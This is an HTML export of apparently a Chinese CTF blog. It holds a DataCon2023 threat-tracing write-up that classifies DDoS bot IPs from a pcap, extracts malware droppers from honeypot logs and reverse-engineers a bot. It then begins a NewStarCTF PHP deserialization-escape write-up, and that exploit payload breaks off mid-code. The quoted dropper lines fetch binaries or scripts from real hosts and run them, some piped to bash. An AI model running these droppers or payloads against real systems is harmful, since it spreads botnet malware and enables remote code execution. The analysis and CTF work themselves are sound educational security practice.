title="解答"></a>解答</h4><p>设置过滤器，编写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyshark<br><br>tshark=<span class="hljs-string">r&quot;C:\sec\Wireshark\tshark.exe&quot;</span> <span class="hljs-comment"># 本地tshark路径</span><br>pcap=<span class="hljs-string">&#x27;../pcap.pcapng&#x27;</span> <span class="hljs-comment"># 本地pcap位置</span><br><br><span class="hljs-comment"># 读取pcap文件并分类</span><br>udp_cap = pyshark.FileCapture(pcap, display_filter=<span class="hljs-string">&#x27;udp&#x27;</span>,tshark_path=tshark)<br>ntp_cap = pyshark.FileCapture(pcap, display_filter=<span class="hljs-string">&#x27;ntp&#x27;</span>,tshark_path=tshark)<br>tls_cap = pyshark.FileCapture(pcap, display_filter=<span class="hljs-string">&#x27;tls&#x27;</span>,tshark_path=tshark)<br>cc2_cap= pyshark.FileCapture(pcap, display_filter=<span class="hljs-string">&#x27;tcp.flags.syn==1 &amp;&amp; tcp.options&#x27;</span>, tshark_path=tshark)<br>syn_cap= pyshark.FileCapture(pcap, display_filter=<span class="hljs-string">&#x27;tcp.flags.syn==1&#x27;</span>, tshark_path=tshark)<br><br><span class="hljs-comment"># 观察到最后时间段除了一个ip以外都是cc1末流量包</span><br>cc1_cap=pyshark.FileCapture(pcap, display_filter=<span class="hljs-string">&#x27;frame.time_relative&gt;=100.053&#x27;</span>, tshark_path=tshark)<br>get_except=(<span class="hljs-string">&quot;92.126.115.64&quot;</span>)<br><br>target=(<span class="hljs-string">&#x27;93.224.28.177&#x27;</span>) <span class="hljs-comment"># 被ddos机ip</span><br><br><span class="hljs-comment"># 用于存储IP地址的集合</span><br>udp_list = <span class="hljs-built_in">set</span>()<br>ntp_list = <span class="hljs-built_in">set</span>()<br>tls_list=<span class="hljs-built_in">set</span>()<br>cc2_list=<span class="hljs-built_in">set</span>()<br>syn_list=<span class="hljs-built_in">set</span>()<br>cc1_list=<span class="hljs-built_in">set</span>()<br><br><span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> cc1_cap:<br>    <span class="hljs-keyword">try</span>:<br>        source_ip = packet.ip.src<br>        <span class="hljs-keyword">if</span> source_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> target <span class="hljs-keyword">and</span> source_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> get_except:<br>            cc1_list.add(source_ip)<br>    <span class="hljs-keyword">except</span> AttributeError:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> cc2_cap:<br>    <span class="hljs-keyword">try</span>:<br>        source_ip = packet.ip.src<br>        <span class="hljs-keyword">if</span> source_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> target <span class="hljs-keyword">and</span> source_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> cc1_list:<br>            cc2_list.add(source_ip)<br>    <span class="hljs-keyword">except</span> AttributeError:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> syn_cap:<br>    <span class="hljs-keyword">try</span>:<br>        source_ip = packet.ip.src<br>        <span class="hljs-keyword">if</span> source_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> target <span class="hljs-keyword">and</span> source_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> cc2_list <span class="hljs-keyword">and</span> source_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> cc1_list:<br>            syn_list.add(source_ip)<br>    <span class="hljs-keyword">except</span> AttributeError:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> tls_cap:<br>    <span class="hljs-keyword">try</span>:<br>        source_ip = packet.ip.src<br>        <span class="hljs-keyword">if</span> source_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> target:<br>            tls_list.add(source_ip)<br>    <span class="hljs-keyword">except</span> AttributeError:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> ntp_cap:<br>    <span class="hljs-keyword">try</span>:<br>        source_ip = packet.ip.src<br>        <span class="hljs-keyword">if</span> source_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> target:<br>            ntp_list.add(source_ip)<br>    <span class="hljs-keyword">except</span> AttributeError:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> udp_cap:<br>    <span class="hljs-keyword">try</span>:<br>        source_ip = packet.ip.src<br>        <span class="hljs-keyword">if</span> source_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ntp_list  <span class="hljs-keyword">and</span> source_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> target:<br>            udp_list.add(source_ip)<br>    <span class="hljs-keyword">except</span> AttributeError:<br>        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-comment"># 将IP地址导出到txt文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;q1_answer.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&#x27;,&#x27;</span>.join(udp_list))<br>    f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    f.write(<span class="hljs-string">&#x27;,&#x27;</span>.join(ntp_list))<br>    f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    f.write(<span class="hljs-string">&#x27;,&#x27;</span>.join(cc2_list))<br>    f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    f.write(<span class="hljs-string">&#x27;,&#x27;</span>.join(syn_list))<br>    f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    f.write(<span class="hljs-string">&#x27;,&#x27;</span>.join(cc1_list))<br></code></pre></td></tr></table></figure><h3 id="题目二：威胁情报的关联分析"><a href="#题目二：威胁情报的关联分析" class="headerlink" title="题目二：威胁情报的关联分析"></a>题目二：威胁情报的关联分析</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p><strong>题目描述</strong>：选手点击下载该题提供的文件，本文件是部分公网蜜罐日志。已知本次的DDoS攻击由僵尸网络团伙发起，该团伙传播了两种恶意样本文件。在本次攻击中，该团伙利用CVE-2019-7238漏洞组建僵尸网络。请找到这两种恶意样本文件，并给出每种恶意样本文件的MD5以及每种恶意样本文件在蜜罐日志的传播源IP和下载站IP（作答时只需给出IP即可，无需具体指定每个IP是传播源还是下载站）。</p><p>下载提供的honeylog.json，观察发现，大部分传输恶意样本文件的流量均使用了wget协议来下载恶意样本，因此可以将带有wget的字符串过滤出来。</p><p>根据题目描述的CVE-2019-7238，其漏洞利用路径为<code>/service/extdirect</code>，可以通过这个路径找到一个恶意样本。</p><h4 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h4><p>编写提取wget字符串的脚本，脚本提取方式为识别<code>wget </code>、<code>wget+</code>或<code>wget%</code>为前缀，<code>;</code>或<code>)</code>为后缀的字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">wget_lines = <span class="hljs-built_in">set</span>()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;honeylog.json&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br>        line = line.strip()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wget &#x27;</span> <span class="hljs-keyword">in</span> line <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;wget%&#x27;</span> <span class="hljs-keyword">in</span> line <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;wget+&#x27;</span> <span class="hljs-keyword">in</span> line:<br>            begin_index=line.find(<span class="hljs-string">&#x27;wget&#x27;</span>)<br>            ll=[<span class="hljs-built_in">len</span>(line)]<br>            <span class="hljs-keyword">if</span> line.find(<span class="hljs-string">&#x27;;&#x27;</span>)!=-<span class="hljs-number">1</span>:<br>                ll.append(line.find(<span class="hljs-string">&#x27;;&#x27;</span>))<br>            <span class="hljs-keyword">if</span> line.find(<span class="hljs-string">&#x27;)&#x27;</span>)!=-<span class="hljs-number">1</span>:<br>                ll.append(line.find(<span class="hljs-string">&#x27;)&#x27;</span>))<br>            end_index = <span class="hljs-built_in">min</span>(ll)<br>            wget_lines.add(line[begin_index:end_index])<br><br><span class="hljs-comment"># 将满足条件的行写入2.txt</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(<span class="hljs-string">&#x27;\n&#x27;</span>.join(wget_lines))<br></code></pre></td></tr></table></figure><p>运行脚本后，得到：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gradle">wget http:<span class="hljs-comment">//miori.lol/miori.arm7 &amp;&amp; chmod 777 miori.arm7 &amp;&amp; ./miori.arm7 selfrep.vigor &amp;&amp; rm -rf miori.arm7</span><br>wget -g <span class="hljs-number">103.178</span>.<span class="hljs-number">232.12</span>  -l <span class="hljs-regexp">/tmp/</span>.oxy -r /mips<br>wget -g <span class="hljs-number">107.173</span>.<span class="hljs-number">231.76</span> -l <span class="hljs-regexp">/tmp/</span>.oxy -r /mips<br>wget http:<span class="hljs-comment">//112.192.5.28:8888/koba -O /tmp/koba &amp;&amp; cd /tmp &amp;&amp; chmod +x koba &amp;&amp; ./koba &amp;&quot;&#125;&#125;</span><br>wget -g <span class="hljs-number">143.198</span>.<span class="hljs-number">91.91</span> -l <span class="hljs-regexp">/tmp/</span>.oxy -r /mips<br>wget -g <span class="hljs-number">193.233</span>.<span class="hljs-number">193.12</span> -l <span class="hljs-regexp">/tmp/</span>.oxy -r <span class="hljs-regexp">/yeye/y</span>eye.mips<br>wget -g <span class="hljs-number">103.183</span>.<span class="hljs-number">118.160</span> -l <span class="hljs-regexp">/tmp/</span>.oxy -r /mips<br>wget http:<span class="hljs-comment">//download.asyncfox.xyz/download/dupa2.sh -O- | bash</span><br>wget -g <span class="hljs-number">109.98</span>.<span class="hljs-number">208.52</span> -l <span class="hljs-regexp">/tmp/</span>.oxy -r /mips<br>wget http:<span class="hljs-comment">//46.29.166.61/arm7 &amp;&amp; chmod 777 arm7 &amp;&amp; ./arm7 selfrep.vigor &amp;&amp; rm -rf arm7</span><br>wget http:<span class="hljs-comment">//74.209.210.114:8888/caesar -O /tmp/caesar &amp;&amp; cd /tmp &amp;&amp; chmod +x caesar &amp;&amp; ./caesar &amp;</span><br>wget http:<span class="hljs-comment">//149.129.92.9:8888/caesar -O /tmp/caesar &amp;&amp; cd /tmp &amp;&amp; chmod +x caesar &amp;&amp; ./caesar &amp;</span><br>wget -g <span class="hljs-number">64.227</span>.<span class="hljs-number">121.58</span> -l <span class="hljs-regexp">/tmp/</span>.oxy -r /mips<br>wget http:<span class="hljs-comment">//45.95.146.26/miori.arm7 &amp;&amp; chmod 777 miori.arm7 &amp;&amp; ./miori.arm7 selfrep.vigor &amp;&amp; rm -rf miori.arm7</span><br></code></pre></td></tr></table></figure><p>其中caesar，koba在大网环境中可以成功下载，使用md5sum计算样本md5值，编写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br>caesar_set = <span class="hljs-built_in">set</span>()<br>caesar_set.add(<span class="hljs-string">&#x27;74.209.210.114&#x27;</span>)<br>caesar_set.add(<span class="hljs-string">&#x27;149.129.92.9&#x27;</span>)<br><br>koba_set=<span class="hljs-built_in">set</span>()<br>koba_set.add(<span class="hljs-string">&#x27;112.192.5.28&#x27;</span>)<br><br><span class="hljs-comment"># 读取文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;honeylog.json&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-comment"># 逐行读取</span><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;caesar&#x27;</span> <span class="hljs-keyword">in</span> line:<br>            <span class="hljs-keyword">try</span>:<br>                data = json.loads(line)<br>                src_ip = data.get(<span class="hljs-string">&#x27;src_ip&#x27;</span>)<br>                <span class="hljs-keyword">if</span> src_ip:<br>                    caesar_set.add(src_ip)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;koba&#x27;</span> <span class="hljs-keyword">in</span> line:<br>            <span class="hljs-keyword">try</span>:<br>                data = json.loads(line)<br>                src_ip = data.get(<span class="hljs-string">&#x27;src_ip&#x27;</span>)<br>                <span class="hljs-keyword">if</span> src_ip:<br>                    koba_set.add(src_ip)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br>        <br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;md5_file.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&#x27;82f485f6d3dbad747ef307158fc7ea48:&#x27;</span>)<br>    f.write(<span class="hljs-string">&#x27;,&#x27;</span>.join(caesar_set))<br>    f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    f.write(<span class="hljs-string">&#x27;e4d87fc7fd025213a86b0db38b147375:&#x27;</span>)<br>    f.write(<span class="hljs-string">&#x27;,&#x27;</span>.join(koba_set))<br></code></pre></td></tr></table></figure><p>得到答案：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">82</span>f485f6d3dbad747ef307158fc7ea<span class="hljs-number">48:149.129.92</span>.<span class="hljs-number">9,74.209.210</span>.<span class="hljs-number">114,194.216.26</span>.<span class="hljs-number">179</span><br>e4d87fc7fd025213a86b0db<span class="hljs-number">38b147375:112</span>.<span class="hljs-number">192.5.28,195</span>.<span class="hljs-number">220.160.50</span><br></code></pre></td></tr></table></figure><h3 id="题目四：消失的窃密流量"><a href="#题目四：消失的窃密流量" class="headerlink" title="题目四：消失的窃密流量"></a>题目四：消失的窃密流量</h3><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p><strong>题目描述</strong>：找到窃密流量最终流向的服务器IP，并根据目前掌握的线索给出**此次攻击事件中(DDoS+窃密)**明确被控的主机IP；请给出原始被窃取文件的MD5。</p><p>我们队伍只找到了部分DDoS的被控ip。</p><h4 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h4><p>使用ida反编译caesar文件，进入main函数</p><img src="/2023/11/16/2023datacon/main.png" class=""><p>进入函数sub_33F9中，发现其调用了多次sub_3A91函数</p><img src="/2023/11/16/2023datacon/33F9.png" class=""><p>进入sub_3A91函数发现是将函数地址写入一个ptr变量。</p><img src="/2023/11/16/2023datacon/3A91.png" class=""><p>查找ptr的调用者，观察到sub_387A函数</p><img src="/2023/11/16/2023datacon/ptr.png" class=""><p>经过分析，该函数是将每个存入的函数地址都进行调用</p><img src="/2023/11/16/2023datacon/387A.png" class=""><p>回到sub_33F9函数中，发现可疑函数sub_5841和sub_6249，进入后发现其均为ddos中发起cc攻击的函数</p><p>sub_5841：</p><img src="/2023/11/16/2023datacon/cc1code.png" class=""><p>sub_6249：</p><img src="/2023/11/16/2023datacon/cc2code.png" class=""><p>因此，将第一题中的cc攻击ip导入进来即可，编写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">url_set=<span class="hljs-built_in">set</span>()<br><br>q1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;q1_answer.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>q1.readline()<br>q1.readline()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> q1.readline().strip().split(<span class="hljs-string">&#x27;,&#x27;</span>):<br>    url_set.add(i)<br>q1.readline()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> q1.readline().strip().split(<span class="hljs-string">&#x27;,&#x27;</span>):<br>    url_set.add(i) <br>q1.close()<br><br>q3=<span class="hljs-string">&#x27;153.97.92.169&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;q4_answer.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(q3)<br>    f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    f.write(<span class="hljs-string">&#x27;,&#x27;</span>.join(url_set))<br>    f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到25%的分数。</p><h2 id="邮件安全"><a href="#邮件安全" class="headerlink" title="邮件安全"></a>邮件安全</h2><h3 id="题目二：新型邮件炸弹攻击"><a href="#题目二：新型邮件炸弹攻击" class="headerlink" title="题目二：新型邮件炸弹攻击"></a>题目二：新型邮件炸弹攻击</h3><p>编写脚本，提取前10000权重的网址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">mails=[]<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;top_mail.csv&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> file:<br>        a=i.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(a[<span class="hljs-number">0</span>])&gt;<span class="hljs-number">10000</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            mails.append(a[<span class="hljs-number">1</span>])<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;top_10000_mails.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&#x27;&#x27;</span>.join(mails))<br></code></pre></td></tr></table></figure><p>从上到下，依次测试发送邮件。</p><p>使用已注册邮箱，如qq.com、gmail.com等发送邮件。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最开始以为比赛会很难，但是感觉难度还可以？</p><p>可惜的是互联网威胁溯源到后面逆向的时候就开始乏力了，做不出来题，感觉该逆的都逆了，该脱壳也手脱了，检查点也一次没少，但就是找不到答案的IP地址，等赛后看看别人的wp吧。</p><p>邮件安全那道题单纯的打着玩，发了两个小时的邮件。</p><p>贴一部分的比赛题目：</p><a href="/2023/11/16/2023datacon/%E4%BA%92%E8%81%94%E7%BD%91%E5%A8%81%E8%83%81%E6%BA%AF%E6%BA%90.zip" title="互联网威胁溯源.zip">互联网威胁溯源.zip</a><br><a href="/2023/11/16/2023datacon/top_mail.csv" title="top_mail.csv">top_mail.csv</a><blockquote><p>更新于2023&#x2F;12&#x2F;10</p><p>官方wp已出，仔细看了一下，发现其实自己没分析出来的东西还有很多，其中找ip地址的时候我也尝试过向169.196.166.199: 16996发包，官方wp是用python发送的，我是直接用nc -u发的包，但是没收到返回的信息，导致我以为它的环境已经关了，于是没了头绪。</p><p>当时以为自己都看的差不多，但现在想了一下，其实我做出来的可能也就一半左右，原因大体上可能是是对C2僵尸网络的原理处于不了解的状态，而且我觉得是对一个领域的整体架构没有构建起来。</p><p>最后把官方wp贴上吧：<a href="https://mp.weixin.qq.com/s/r9_UgXoAXkkGJwGKdPyiRQ">DataCon2023互联网威胁溯源赛道，冠军战队WP分享 (qq.com)</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>wireshark</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2023-WEEK4 Web WriteUp</title>
    <link href="/2023/11/05/2023newstarctfWeek4/"/>
    <url>/2023/11/05/2023newstarctfWeek4/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>解题 4&#x2F;7</p><h2 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h2><p>打开容器，看到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;bad&quot;</span>,<span class="hljs-string">&quot;good&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GetFlag</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>]))));<br></code></pre></td></tr></table></figure><p>明显的php反序列化逃逸，利用原理即使用大量的bad替换为good来逃逸php反序列化的字符数量标记</p><p>给出payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;bad&quot;</span>, <span class="hljs-string">&quot;good&quot;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GetFlag</span>(<span 